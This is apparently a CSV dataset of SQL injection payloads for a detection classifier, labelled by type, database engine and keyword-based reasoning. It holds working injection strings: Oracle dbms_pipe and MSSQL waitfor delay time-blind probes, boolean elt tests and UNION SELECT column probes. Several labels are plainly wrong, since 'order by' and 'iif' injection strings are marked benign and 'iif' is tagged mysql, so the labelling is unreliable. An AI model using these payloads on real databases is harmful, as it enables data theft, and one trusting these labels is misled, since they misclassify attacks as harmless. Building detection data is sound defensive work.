id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19433,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'nuil' like 'nuil",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
19477,"1"" ) as ipxg where 4031 = 4031 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
19406,"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
19423,"1"" ) ) as pxdp where 4575 = 4575 and elt ( 8258 = 7218,7218 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
19429,1' in boolean mode ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 32 chars.,2
19432,"iif ( 5214 = 7412,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
19484,-8641%' order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
19499,"1'|| ( select 'xjcg' from dual where 5815 = 5815 union all select null,null,null#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
19507,"1'|| ( select 'vqag' from dual where 8154 = 8154 union all select null,null,null,null,null,null,null,null,null,null--",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
19513,"1'|| ( select 'ativ' from dual where 4746 = 4746 union all select null,null,null,null#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
19514,"1,iif ( 6625 = 6625,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 27 chars.,2
19530,waitfor delay '0:0:5' and ( ( ( 8981 = 8981,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
19545,"iif ( 2869 = 9448,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
19556,"-4047'|| ( select 'rqta' from dual where 9743 = 9743 union all select 9743,9743,9743#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
19592,1' ) ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
